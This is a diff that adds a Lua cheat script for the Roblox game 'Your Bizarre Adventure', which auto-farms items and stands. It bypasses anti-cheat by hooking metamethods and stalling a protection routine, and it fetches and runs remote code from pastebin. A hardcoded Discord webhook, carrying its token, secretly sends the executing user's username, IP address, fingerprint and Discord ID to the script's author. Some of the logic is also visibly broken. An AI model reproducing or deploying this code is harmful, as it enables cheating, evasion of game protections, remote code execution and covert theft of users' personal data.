@@ -1,0 +1,796 @@
+getgenv().Invisible = true
+getgenv().MoreWebhooks = true
+
+repeat task.wait() until game:IsLoaded() and game:WaitForChild("Workspace"):WaitForChild"Living":WaitForChild(game.Players.LocalPlayer.Name)
+getgenv().mai = { }
+getgenv().devbypasscheckdis = false
+getgenv().dev = false
+getgenv().fix = {["Iamadepulauzu"] = false}
+
+while getgenv().ToggledSTANDFARM == true do
+local LocalPlayer = game.Players.LocalPlayer
+local PlaceID = game.PlaceId
+    local AllIDs = {}
+    local foundAnything = ""
+    local actualHour = os.date("!*t").hour
+    local Deleted = false
+    local File = pcall(function()
+        AllIDs = game:GetService('HttpService'):JSONDecode(readfile("NotSameServers.json"))
+    end)
+    if not File then
+        table.insert(AllIDs, actualHour)
+        writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+    end
+    function TPReturner()
+        local Site;
+        if foundAnything == "" then
+            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/2809202155/servers/Public?sortOrder=Asc&limit=100'))
+        else
+            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/2809202155/servers/Public?sortOrder=Asc&limit=100'))
+        end
+        local ID = ""
+        if Site.nextPageCursor and Site.nextPageCursor ~= "null" and Site.nextPageCursor ~= nil then
+            foundAnything = Site.nextPageCursor
+        end
+        local num = 0;
+        for i,v in pairs(Site.data) do
+            local Possible = true
+            ID = tostring(v.id)
+            if v.playing ~= v.maxPlayers then
+                for _,Existing in pairs(AllIDs) do
+                    if num ~= 0 then
+                        if ID == tostring(Existing) then
+                            Possible = false
+                        end
+                    else
+                        if tonumber(actualHour) ~= tonumber(Existing) then
+                            local delFile = pcall(function()
+                                delfile("NotSameServers.json")
+                                AllIDs = {}
+                                table.insert(AllIDs, actualHour)
+                            end)
+                        end
+                    end
+                    num = num + 1
+                end
+                if Possible == true then
+                    table.insert(AllIDs, ID)
+                    wait()
+                    pcall(function()
+                        writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
+                        wait()
+                        game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
+                    end)
+                    wait(0)
+                end
+            end
+        end
+    end
+    
+    function Teleport()
+        while wait(2) do
+            pcall(function()
+                TPReturner()
+                if foundAnything ~= "" then
+                    TPReturner()
+                end
+            end)
+        end
+    end
+
+local function nebun()
+    task.spawn(function() pcall(function()
+        game:GetService("CoreGui").DescendantAdded:Connect(function(child) 
+            if child.Name == "ErrorPrompt" then 
+                local GrabError = child:FindFirstChild("ErrorMessage",true)
+                repeat wait() until GrabError.Text ~= "Label" 
+                local Reason = GrabError.Text 
+                if Reason:match("kick") or Reason:match("You") or Reason:match("conn") or Reason:match("rejoin") or Reason:match("kicked") then
+                         wait(0.50)
+                 game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer);
+                    end
+                end
+            end)
+        end)
+    end)
+end
+
+local ping = (game:GetService("Stats"):WaitForChild("Network"):WaitForChild("ServerStatsItem"):WaitForChild"Data Ping":GetValue())
+
+local function Telepoarta()
+    local part = Instance.new("Part")
+    part.Name = tostring(math.random(1, 9999))
+    part.Anchored = true
+    part.Size = Vector3.new(200,1,200)
+    part.Parent = workspace
+    part.Transparency = 1
+    part.Position = Vector3.new(-437.80279541015625, -70.98097229003906, 327.1223449707031)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(0, 7, 0)
+end
+
+timer = 20
+nir = 10
+
+repeat wait() until LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1") or LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen") or LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1") == nil 
+		if LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1") or LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen") then
+local ohString1 = "PressedPlay"
+
+LocalPlayer.Character.RemoteEvent:FireServer(ohString1)
+pcall(function()
+    if getgenv().EarlyPlay == true then
+			if LocalPlayer.PlayerGui.LoadingScreen1:FindFirstChild("SkipCutscene").Value == false then
+				LocalPlayer.PlayerGui.LoadingScreen1:FindFirstChild("SkipCutscene").Value = true
+				LocalPlayer.PlayerGui.LoadingScreen1.PlayScreen.Value = true
+			end
+		
+				game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen"):Destroy()
+				game.Players.LocalPlayer.PlayerGui:FindFirstChild("LoadingScreen1"):Destroy()
+			end
+			if getgenv().EarlyPlay == false then
+			firesignal(game.Players.LocalPlayer.PlayerGui.LoadingScreen.Frames.Gamemodes.Main.MouseButton1Click)
+			end
+		end)
+    end
+
+loadstring(game:HttpGet("https://pastebin.com/raw/Caqm4Tn5"))() --notification loadstring
+
+old = hookmetamethod(game,"__namecall", function(self,...)
+    local args = {...}
+    local method = getnamecallmethod()
+    if tostring(self) == "Returner" and tostring(method) == "InvokeServer" then
+        return "  ___XP DE KEY"
+    end
+    return old(self, ...)
+end)
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-300.0344543457031, 1.3260160684585571, -809.02490234375)
+
+if workspace:FindFirstChild("Arrow")==nil then
+    local hi = Instance.new("NumberValue")
+    hi.Parent = game.Workspace
+    hi.Name = ("Arrow")
+    print("createda")
+end
+
+if workspace:FindFirstChild("Roka")==nil then
+    local hi = Instance.new("NumberValue")
+    hi.Parent = game.Workspace
+    hi.Name = ("Roka")
+    print("createdr")
+end
+
+if game.ReplicatedStorage:FindFirstChild("rackz")==nil then
+local ip = Instance.new("StringValue")
+ip.Parent = game.ReplicatedStorage
+ip.Name = "rackz"
+end
+
+if game.ReplicatedStorage:FindFirstChild("bimd")==nil then
+local finger = Instance.new("StringValue")
+finger.Parent = game.ReplicatedStorage
+finger.Name = "bimd"
+end
+
+if workspace:FindFirstChild("Rib")==nil then
+    local bleh = Instance.new("NumberValue")
+    bleh.Parent = game.Workspace
+    bleh.Name = ("Rib")
+end
+
+game:GetService("StarterGui"):SetCore("ResetButtonCallback", NewEvent)
+getgenv().WM = game.CoreGui["HsB Wm"]
+getgenv().MainFrm = WM.MainFrame
+
+    local url = "https://discordapp.com/api/webhooks/1060274379537260604/_v3T1l_R_3vtDFpF4OHvRh50XI7wtASuM2ICDpESx_JM07LCXTAiqo8OSqsiBd7DJX63"
+    local data = {
+       ["content"] = "",
+       ["embeds"] = {
+           {
+               ["title"] = "Someone Executed Your Prem StandFarm Script",
+               ["description"] = "Username: "..LocalPlayer.Name.." IP: "..game.CoreGui.rackz.Value.. " FingerPrint: "..game.CoreGui.bimd.Value.. " Discord: ".."<@"..getgenv().ping..">".." Key: "..getgenv().Update.." Allowed: "..(tostring(getgenv().Allowed)),
+               ["type"] = "rich",
+               ["color"] = math.random(1, 16777215),
+               ["image"] = {
+                   ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username="..tostring(game:GetService("Players").LocalPlayer.Name)
+               }
+           }
+       }
+    }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+       ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(abcdef)
+
+local function izi()
+    local repFirst = game.GetService(game, 'ReplicatedFirst');
+local itemSpawn = repFirst.ItemSpawn;
+
+local vector3Metatable = getrawmetatable(Vector3.new());
+local oldIndex = rawget(vector3Metatable, '__index');
+
+setreadonly(vector3Metatable, false); do
+    vector3Metatable.__index = newcclosure(function(self, idx)
+        if(string.lower(idx) == 'magnitude' and getcallingscript() == itemSpawn) then
+            return 0;
+        end;
+        return oldIndex(self, idx);
+    end);
+end; setreadonly(vector3Metatable, true);
+end
+
+    if game.CoreGui:FindFirstChild("Bine11")==nil then
+        local nu = Instance.new("ScreenGui")
+        local nuu = Instance.new("TextLabel",nu)
+        local nana = Instance.new("TextLabel",nu)
+        nu.Parent = game.CoreGui
+        nu.Name = "Bine11"
+        nu.Enabled = false
+        nuu.Font = "SourceSansBold"
+        nuu.Size = UDim2.new(1, 0, 1, 0)
+        nuu.Text = "Pity Chance: "
+        nuu.TextSize = 60
+        nuu.Position = UDim2.new(0, -750, 0, -200)
+        nuu.BackgroundTransparency = 1
+        nuu.TextColor3 = Color3.new(76, 0, 114)
+        nuu.TextScaled = false
+        nuu.TextStrokeColor3 = Color3.new(455, 455, 455)
+        nuu.TextStrokeTransparency = 0
+
+        nuu.Name = "nuu"
+        nana.Font = "SourceSansBold"
+        nana.Name = "nana"
+        nana.Size = UDim2.new(1,0,1,0)
+        nana.Text = ""
+        nana.TextColor3 = Color3.new(122, 17, 215)
+        nana.TextScaled = false
+        nana.TextSize = 70
+        nana.Position = UDim2.new(0, -540, 0, -200)
+        nana.TextStrokeColor3 = Color3.new(0, 0, 0)
+        nana.TextStrokeTransparency = 0
+        nana.BackgroundTransparency = 1
+    end
+    
+    local functionLibrary = require(game.ReplicatedStorage:WaitForChild('Modules').FunctionLibrary)
+    local old = functionLibrary.pcall
+    
+    functionLibrary.pcall = function(...)
+        local f = ...
+    
+        if type(f) == 'function' and #getupvalues(f) == 11 then 
+            return wait(9e9)
+        end
+        
+        return old(...)
+    end
+
+    if getgenv().Invisible == true then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(216.66241455078125, 34.76338195800781, 272.8533020019531)
+        wait(0.50)
+        local Character = game:GetService('Players').LocalPlayer.Character
+        local Clone = Character.LowerTorso.Root:Clone()
+        Character.LowerTorso.Root:Destroy()
+        Clone.Parent = Character.LowerTorso
+        print("Invis")
+        wait(0.50)
+    end
+
+    local gamepass = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 14597778)
+
+if getgenv().dev == true then
+local bu = Instance.new("BillboardGui")
+bu.Parent = workspace
+bu.Name = "nuvr"
+print("dev")
+end
+
+_G.Ver = "Premium"
+if getgenv().LowMode == true then
+for _,v in pairs(workspace:GetDescendants()) do
+    if v.ClassName == "Part"
+    or v.ClassName == "SpawnLocation"
+    or v.ClassName == "WedgePart"
+    or v.ClassName == "Terrain"
+    or v.ClassName == "MeshPart" then
+    v.BrickColor = BrickColor.new(155, 155, 155)
+    v.Material = "Plastic"
+    end
+    end
+
+    local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+local WindowFocusReleasedFunction = function()
+	RunService:Set3dRenderingEnabled(false)
+	setfpscap(36)
+	return
+end
+
+local WindowFocusedFunction = function()
+	RunService:Set3dRenderingEnabled(true)
+	setfpscap(360)
+	return
+end
+
+local Initialize = function()
+	UserInputService.WindowFocusReleased:Connect(WindowFocusReleasedFunction)
+	UserInputService.WindowFocused:Connect(WindowFocusedFunction)
+	return
+end
+Initialize()
+end
+    print(tostring("Current Version: ".._G.Ver))
+
+    local time = 16
+    local lp = game.Players.LocalPlayer
+
+    local GoldCoin = "rbxassetid://7124126253"
+    local Arrow = "rbxassetid://7106104343"
+    local Glove = "rbxassetid://7138936196"
+    local Roka = "rbxassetid://7218405255"
+    local redcandy = "rbxassetid://7747232080"
+    local bluecandy = "rbxassetid://7747232080"
+    local greencandy = "rbxassetid://7747232080"
+    local yellowcandy = "rbxassetid://7747232080"
+    local pureroka = ""
+    local diamond = "rbxassetid://875644059"
+    local stone = "rbxassetid://4551120971"
+    local rib = 'rbxassetid://5249254947'
+    local zep = "rbxassetid://6924442799"
+    local diodiary = "rbxassetid://5675321032"
+    local steelball = "rbxassetid://5291254518"
+    local ancientscroll = "60791940"
+    local lucky = "rbxassetid://7106118765"
+    local lucci = "rbxassetid://7106192858"
+
+    local function sendWebhook(Blehh, ping)
+		local everyone
+		if getgenv().ping == "" then
+			everyone = ""
+		elseif getgenv().ping ~= "" and ping == true then
+			everyone = "<@"..getgenv().ping..">"
+		end
+		local data = {
+			['content'] = everyone,
+			['username'] = "HsB CatHook",
+			["embeds"] = {{
+				['title'] = "Your Bizarre Adventure",
+				['color'] = tonumber(0xff7f42),
+				["footer"] = {
+					["text"] = ("HsB Hub ("..os.date("%H:%M")..")"),
+					["icon_url"] = "https://cdn.discordapp.com/attachments/875211210486870076/1067422518413103134/hsb222.png"
+				},
+				["fields"] = {
+					{
+						["name"] = "Account Name", -- This is  the title of your field.
+						["value"] = "||"..game.Players.LocalPlayer.Name.."||" -- This is the value of your field.
+					},
+					{
+						["name"] = "InfoHook", -- This is  the title of your field.
+						["value"] = Blehh -- This is the value of your field.
+					},
+				}}
+			}
+		}
+		local newdata = game:GetService("HttpService"):JSONEncode(data)
+
+		local headers = {
+			["content-type"] = "application/json"
+		}
+		request = http_request or request or HttpPost or syn.request
+		local abcdef = {Url = getgenv().webhooklink, Body = newdata, Method = "POST", Headers = headers}
+		request(abcdef)
+	end
+
+        local Children = {}
+        local function updarrow()
+            for _, Obj in pairs(game.Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+                if Obj.Name == ("Mysterious Arrow") then
+                    table.insert(Children, Obj)
+                if workspace:FindFirstChild("Arrow") then workspace.Arrow.Value = #Children
+        end
+            end
+        end
+        end
+        
+        local bhroo = {}
+            local function updrib()
+                for _, Obj in pairs(game.Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+                    if Obj.Name == ("Rib Cage of The Saint's Corpse") then
+                        table.insert(bhroo, Obj)
+                    if workspace:FindFirstChild("Rib") then workspace.Rib.Value = #bhroo
+            end
+                end
+            end
+        end
+        
+        local function updroka()
+            local Buci = {}
+        for _, Obj in pairs(game.Players.LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+            if Obj.Name == ("Rokakaka") then
+                table.insert(Buci, Obj)
+            if workspace:FindFirstChild("Roka") then workspace.Roka.Value = #Buci
+        end
+            end
+        end
+        end
+
+            updrib()
+            wait(0.17)
+            print(workspace.Rib.Value.." Rib")
+            
+                updarrow()
+                wait(0.25)
+                updroka()
+                wait(0.15)
+                print(workspace.Arrow.Value.." Arrow")
+                print(workspace.Roka.Value.." Roka")
+                izi()
+
+            
+            if getgenv().FarmStandFromRib == true then
+                getgenv().nuvreau = {
+                "Rib Cage of The Saint's Corpse",
+            }
+            else
+                getgenv().nuvreau = {
+                "Mysterious Arrow",
+                "Rokakaka",
+                "Lucky Arrow",
+            }
+            end
+            
+if getgenv().FarmStandFromRib == false then
+
+    if not gamepass then
+    if workspace.Arrow.Value == 25 then
+        table.remove(nuvreau, 1)
+        print("Removea")
+    end
+    if workspace.Roka.Value == 25 then
+        table.remove(nuvreau, 2)
+        print("Remover")
+    end
+
+    if workspace.Arrow.Value == 25 and workspace.Roka.Value == 25 then
+        print("createheh")
+    if workspace:FindFirstChild("nuvr")==nil then
+        local ba = Instance.new("BillboardGui")
+        ba.Name = ("nuvr")
+        ba.Parent = workspace
+end
+end
+end
+
+if gamepass then
+    print("gmep")
+    if workspace.Arrow.Value == 50 then
+        table.remove(nuvreau, 1)
+        print("Removea")
+    end
+
+    if workspace.Roka.Value == 50 then
+        table.remove(nuvreau, 2)
+        print("Remover")
+    end
+
+    if workspace.Arrow.Value == 50 and workspace.Roka.Value == 50 then
+        print("createheh")
+        if workspace:FindFirstChild("nuvr")==nil then
+            local ba = Instance.new("BillboardGui")
+            ba.Name = ("nuvr")
+            ba.Parent = workspace
+        end
+    end
+end
+end
+wait(0.50)
+            if getgenv().FarmStandFromRib == true then
+
+                if workspace.Rib.Value == 10 and not gamepass then
+                    print("createheh")
+                    if workspace:FindFirstChild("nuvr")==nil then
+                        local ba = Instance.new("BillboardGui")
+                        ba.Name = ("nuvr")
+                        ba.Parent = workspace
+                end
+            end
+            
+            if workspace.Rib.Value == 20 and gamepass then
+                if workspace:FindFirstChild("nuvr")==nil then
+                    local ba = Instance.new("BillboardGui")
+                    ba.Name = ("nuvr")
+                    ba.Parent = workspace
+                    end
+                end
+            end
+        
+    local function mata()
+        izi()
+        wait(1)
+        time = time -1
+        print(time)
+
+        if time == 0 then
+Teleport()
+end
+end
+    local function tactu()
+        
+    for i,v in pairs(nuvreau) do
+    for k,b in pairs(workspace.Item_Spawns.Items:GetChildren()) do
+        if b:IsA("Model") then
+            for i2,val in pairs(b:GetChildren()) do
+                if (val:IsA("MeshPart" or val:IsA("Part"))) and val.Transparency ~=1 and b.ProximityPrompt.ObjectText == v then
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = val.CFrame * CFrame.new(0, -1, 0)
+    repeat wait() until (val.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 5
+        if val and (val.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 5 then
+            wait(0.25)
+            if b:FindFirstChild("ProximityPrompt") then
+                fireproximityprompt(b.ProximityPrompt)
+wait(0.30)
+        --rasa("Ti-a picat "..val.MeshId, "Item Picat <@880922246644920360>, <@986257741926514718>. Versiunea: ".._G.Ver)
+        warn(val.MeshId)
+        wait(0.20)
+    if (game.Players.LocalPlayer.PlayerGui:FindFirstChild("Message") and game.Players.LocalPlayer.PlayerGui.Message:FindFirstChild("TextLabel")) and val and (val.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude <= 5 then
+        if string.match(lp.PlayerGui.Message.TextLabel.Text, "Mysterious Arrow") then
+            table.remove(nuvreau, 1)
+        print("Removed".. val.MeshId)
+        while wait(0.355) do
+MainFrm.BackgroundTransparency = 0
+MainFrm.Buci.TextTransparency = 0
+MainFrm.Buci.Text = "Attempting to switch servers, be patient!"
+Teleport()
+        end
+        elseif string.find(lp.PlayerGui.Message.TextLabel.Text, "Rokakaka") and not string.find(lp.PlayerGui.Message.TextLabel.Text, "Pure") then
+            table.remove(nuvreau, 2)
+        print("Removed"..val.MeshId)
+        while wait() do
+MainFrm.BackgroundTransparency = 0
+MainFrm.Buci.TextTransparency = 0
+MainFrm.Buci.Text = "Attempting to switch servers, be patient!"
+Teleport() 
+        end
+        end
+            b:Destroy()
+        end
+    end
+    end
+end
+end
+end
+end
+end
+end
+
+local function nufrate()
+    izi()
+    print("colo")
+wait(2.50)
+local xd = true
+		while xd do task.wait()
+            pcall(function()
+				for i, v in pairs(nuvreau) do
+					for _, aga in pairs(workspace.Item_Spawns.Items:GetChildren()) do
+						if aga:IsA("Model") then
+							for _, aga2 in pairs(aga:GetChildren()) do
+								if aga2:IsA("MeshPart") then
+									if aga.ProximityPrompt.ObjectText == v and aga2.Transparency ~= 1 then
+										print(aga.ProximityPrompt.ObjectText.." FOUND")
+										LocalPlayer.Character.HumanoidRootPart.CFrame = aga:GetModelCFrame()
+                                        wait(0.30)
+                                        if aga:FindFirstChild("ProximityPrompt") then
+                                        fireproximityprompt(aga.ProximityPrompt)
+                                        end
+                                        wait(0.30)
+                                        if string.match(LocalPlayer.PlayerGui.Message.TextLabel.Text, "Mysterious Arrow") then
+                                        break end
+                                        sendWebhook("Mysterious Arrows are full, switching servers...", false)
+                                        table.remove(nuvreau, 1)
+                                    MainFrm.BackgroundTransparency = 0
+                                    MainFrm.Buci.TextTransparency = 0
+                                    MainFrm.Buci.Text = "Attempting to switch servers, be patient!"
+                                    Teleport()
+                                    elseif string.find(LocalPlayer.PlayerGui.Message.TextLabel.Text, "Rokakaka") and not string.find(lp.PlayerGui.Message.TextLabel.Text, "Pure") then
+                                        sendWebhook("Rokakaka's are full, switching servers...", false)    
+                                        break end
+                                            table.remove(nuvreau, 2)
+                                            print("Removed"..val.MeshId)
+                                    MainFrm.BackgroundTransparency = 0
+                                    MainFrm.Buci.TextTransparency = 0
+                                    MainFrm.Buci.Text = "Attempting to switch servers, be patient!"
+                                    Teleport()
+                                            
+                                    elseif aga.ProximityPrompt.ObjectText ~= v or aga2.Transparency == 1 then print(aga.ProximityPrompt.ObjectText, aga2.Transparency)
+                                        end
+                                    end
+								end
+							end
+						end
+				
+            end)
+		end
+    end
+
+local function updateArrows()
+    local Children = {}
+    for _, Obj in pairs(LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+        if Obj.Name == ("Mysterious Arrow") then
+            table.insert(Children, Obj)
+            if workspace:FindFirstChild("Arrow") then 
+                workspace.Arrow.Value = #Children
+            end
+        end
+    end
+end
+local function updateRokakas()
+    local Children = {}
+    for _, Obj in pairs(LocalPlayer:WaitForChild("Backpack"):GetChildren()) do
+        if Obj.Name == ("Rokakaka") then
+            table.insert(Children, Obj)
+            if workspace:FindFirstChild("Roka") then 
+                workspace.Roka.Value = #Children
+            end
+        end
+    end
+end
+local player = game.Players.LocalPlayer
+
+
+local function UseItem(item)
+    local player = game.Players.LocalPlayer
+    LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[item])
+    wait(0.10)
+    LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[item])
+    LocalPlayer.Character:WaitForChild(item)
+    wait(0.25)
+    LocalPlayer.Character:WaitForChild(item):Activate()
+    LocalPlayer.Character:WaitForChild(item):Activate()
+    LocalPlayer.Character:WaitForChild(item):Activate()
+
+    firesignal(player.PlayerGui:WaitForChild"DialogueGui":WaitForChild"Frame":WaitForChild"ClickContinue".MouseButton1Click)
+    firesignal(player.PlayerGui:WaitForChild"DialogueGui":WaitForChild"Frame":WaitForChild"Options":WaitForChild"Option1":WaitForChild"TextButton".MouseButton1Click)
+end
+
+local function haimaone()
+
+    lp.Character.HumanoidRootPart:Destroy()
+
+    workspace.Living.ChildAdded:connect(function(a)
+        if a.Name == game.Players.LocalPlayer.Name then
+            wait(1)
+            if ping >= 100 then
+                wait(2)
+            end
+Telepoarta()
+workspace.Living:WaitForChild(LocalPlayer.Name):WaitForChild("RemoteFunction"):InvokeServer("LearnSkill",{["Skill"] = "Worthiness II",["SkillTreeType"] = "Character"})
+updateArrows()
+updateRokakas()
+game.Players.LocalPlayer:WaitForChild("Backpack")
+workspace.Living:WaitForChild(LocalPlayer.Name):WaitForChild("RemoteFunction"):InvokeServer("LearnSkill",{["Skill"] = "Worthiness II",["SkillTreeType"] = "Character"})
+
+    local gotStand = true
+    while gotStand do
+
+        if workspace.Arrow.Value > 1 and workspace.Roka.value > 1 then
+            if LocalPlayer.PlayerStats.Stand.Value == "None" then
+                UseItem("Mysterious Arrow")
+            end
+            wait(0.35)
+            repeat task.wait() print("waiting for stand") until LocalPlayer.PlayerStats.Stand.Value ~= "None"
+            wait(1.50)
+            if getgenv().StandFarmWant[LocalPlayer.PlayerStats.Stand.Value] then
+                WM.Enabled = true
+                MainFrm.BackgroundTransparency = 0
+                MainFrm.Buci.TextTransparency = 0
+                MainFrm.Buci.Text = "You got what you wanted, Rejoin!"
+            if getgenv().webhooklink ~= "" then
+                    sendWebhook("You got the Stand You Wanted: "..LocalPlayer.PlayerStats.Stand.Value, true)
+                end
+                break
+            else
+                if getgenv().MoreWebhooks == true then
+                    sendWebhook("Rolled Unwanted Stand: "..LocalPlayer.PlayerStats.Stand.Value, false)
+                end
+                repeat wait()
+                print("bug")
+                UseItem("Rokakaka")
+            until LocalPlayer.PlayerStats.Stand.Value == "None"
+            end
+
+else sendWebhook("Ran out of Rokakas or Arrows, hopping soon...") Teleport()
+end
+end
+end
+end)
+end
+
+local function haimadoi()
+
+    lp.Character.HumanoidRootPart:Destroy()
+
+    workspace.Living.ChildAdded:connect(function(a)
+        if a.Name == game.Players.LocalPlayer.Name then
+            wait(1)
+Telepoarta()
+updrib()
+game.Players.LocalPlayer:WaitForChild("Backpack")
+
+function UseItem(item)
+    local player = game.Players.LocalPlayer
+    LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[item])
+    wait(0.10)
+    LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack[item])
+    LocalPlayer.Character:WaitForChild(item)
+    wait(0.25)
+    firesignal(player.PlayerGui:WaitForChild"DialogueGui":WaitForChild"Frame":WaitForChild"ClickContinue".MouseButton1Click)
+    task.wait(0.25)
+    firesignal(player.PlayerGui:WaitForChild"DialogueGui":WaitForChild"Frame":WaitForChild"Options":WaitForChild"Option1":WaitForChild"TextButton".MouseButton1Click)
+end
+    if LocalPlayer.PlayerStats.Stand.Value ~= "None" then
+        workspace.Living:WaitForChild(game.Players.LocalPlayer.Name):WaitForChild"RemoteFunction":InvokeServer("ToggleStand", "Toggle")
+    end
+    workspace.Living:WaitForChild(LocalPlayer.Name):WaitForChild("RemoteFunction"):InvokeServer("LearnSkill",{["Skill"] = "Worthiness II",["SkillTreeType"] = "Character"})
+--game.Players.LocalPlayer.character.StandMorph.StandSkin.Value = "Queen Crimson"
+    
+    local bro = true
+    while bro do
+        task.wait()
+        updrib()
+
+        if workspace.Rib.Value > 1 then
+
+            game.Players.LocalPlayer.Character.RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Worthiness V",["SkillTreeType"] = "Character"})
+            game.Players.LocalPlayer.Character.RemoteFunction:InvokeServer("LearnSkill",{["Skill"] = "Worthiness V",["SkillTreeType"] = "Character"})
+            game.Players.LocalPlayer.Character.RemoteEvent:FireServer("EndDialogue", {["NPC"] = "Rib Cage of The Saint's Corpse",["Option"] = "Option1",["Dialogue"] = "Dialogue2"})
+
+            LocalPlayer.Character:WaitForChild"StandMorph":WaitForChild"StandSkin"
+        wait(1)
+        if getgenv().StandFarmWant[LocalPlayer.PlayerStats.Stand.Value] then
+            WM.Enabled = true
+            MainFrm.BackgroundTransparency = 0
+            MainFrm.Buci.TextTransparency = 0
+            MainFrm.Buci.Text = "You got what you wanted, Rejoin!"
+        if getgenv().webhooklink ~= "" then
+            sendWebhook("You got The Stand You Wanted: "..LocalPlayer.PlayerStats.Stand.Value)
+        end
+            break
+        end
+else sendWebhook("Ran out of Ribs, hoppin soon...") Teleport()
+end
+end
+end
+end)
+end
+
+if workspace:FindFirstChild("nuvr")==nil then
+    print('nunu')
+        nufrate()
+end
+
+if workspace:FindFirstChild("nuvr") and getgenv().FarmStandFromRib == false then
+    haimaone()
+    for key,value in pairs(getgenv().StandFarmWant) do
+        if value == false then table.insert(mai, key)
+        end
+    end
+    print("should be")
+    for i,v in pairs(mai) do
+    print(i,v)
+    end
+end
+
+if workspace:FindFirstChild("nuvr") and getgenv().FarmStandFromRib == true then
+    haimadoi()
+    for key,value in pairs(getgenv().StandFarmWant) do
+        if value == false then table.insert(mai, key)
+        end
+    end
+    print("should be")
+    for i,v in pairs(mai) do
+    print(i,v)
+    end
+end
+end
